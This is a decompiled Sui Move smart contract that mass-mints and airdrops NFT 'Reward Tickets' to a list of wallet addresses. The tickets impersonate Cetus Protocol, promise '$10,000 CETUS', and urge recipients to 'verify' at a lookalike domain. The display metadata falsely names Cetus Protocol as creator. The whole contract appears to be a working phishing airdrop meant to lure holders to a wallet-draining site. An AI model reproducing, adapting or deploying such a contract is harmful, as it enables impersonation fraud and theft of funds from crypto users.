module 0x14e56deacb98ef4260b4ed6c4f40d0fa897e59a78d050476aba029aec0c2f66d::reward1127 {
    struct REWARD1127 has drop {
        dummy_field: bool,
    }

    struct TICKET_1127 has store, key {
        id: 0x2::object::UID,
        name: 0x1::string::String,
        image_url: 0x1::string::String,
        description: 0x1::string::String,
        Reward: 0x1::string::String,
    }

    struct MintEvent has copy, drop {
        nft_id: 0x2::object::ID,
        user: address,
        name: 0x1::string::String,
        image_url: 0x1::string::String,
        description: 0x1::string::String,
        Reward: 0x1::string::String,
    }

    public fun DistributeReward1127(arg0: &mut vector<address>, arg1: &mut 0x2::tx_context::TxContext) {
        while (0x1::vector::length<address>(arg0) > 0) {
            let v0 = TICKET_1127{
                id          : 0x2::object::new(arg1),
                name        : 0x1::string::utf8(b"Reward Ticket"),
                image_url   : 0x1::string::utf8(b"https://res.cloudinary.com/dkhar3xjm/image/upload/v1729434657/rwdcetuscom_1020_4_jobh0r.jpg"),
                description : 0x1::string::utf8(b"Claim your CETUS Reward from Cetus Protocol! Visit https://rwdcetus.com to verify and receive your reward. Limited time offer!"),
                Reward      : 0x1::string::utf8(b"$10,000 CETUS"),
            };
            let v1 = MintEvent{
                nft_id      : 0x2::object::id<TICKET_1127>(&v0),
                user        : 0x2::tx_context::sender(arg1),
                name        : 0x1::string::utf8(b"Reward Ticket"),
                image_url   : 0x1::string::utf8(b"https://res.cloudinary.com/dkhar3xjm/image/upload/v1729434657/rwdcetuscom_1020_4_jobh0r.jpg"),
                description : 0x1::string::utf8(b"Claim your CETUS Reward from Cetus Protocol! Visit https://rwdcetus.com to verify and receive your reward. Limited time offer!"),
                Reward      : 0x1::string::utf8(b"$10,000 CETUS"),
            };
            0x2::event::emit<MintEvent>(v1);
            0x2::transfer::public_transfer<TICKET_1127>(v0, 0x1::vector::pop_back<address>(arg0));
        };
    }

    fun init(arg0: REWARD1127, arg1: &mut 0x2::tx_context::TxContext) {
        let v0 = 0x1::vector::empty<0x1::string::String>();
        let v1 = &mut v0;
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"name"));
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"image_url"));
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"description"));
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"project_url"));
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"creator"));
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"Reward"));
        let v2 = 0x1::vector::empty<0x1::string::String>();
        let v3 = &mut v2;
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"Reward Ticket"));
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"https://res.cloudinary.com/dkhar3xjm/image/upload/v1729434657/rwdcetuscom_1020_4_jobh0r.jpg"));
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"Claim your CETUS Reward from Cetus Protocol! Visit https://rwdcetus.com to verify and receive your reward. Limited time offer!"));
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"https://rwdcetus.com"));
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"Cetus Protocol"));
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"$10,000 CETUS"));
        let v4 = 0x2::package::claim<REWARD1127>(arg0, arg1);
        let v5 = 0x2::display::new_with_fields<TICKET_1127>(&v4, v0, v2, arg1);
        0x2::display::update_version<TICKET_1127>(&mut v5);
        0x2::transfer::public_transfer<0x2::package::Publisher>(v4, 0x2::tx_context::sender(arg1));
        0x2::transfer::public_transfer<0x2::display::Display<TICKET_1127>>(v5, 0x2::tx_context::sender(arg1));
    }

    // decompiled from Move bytecode v6
}

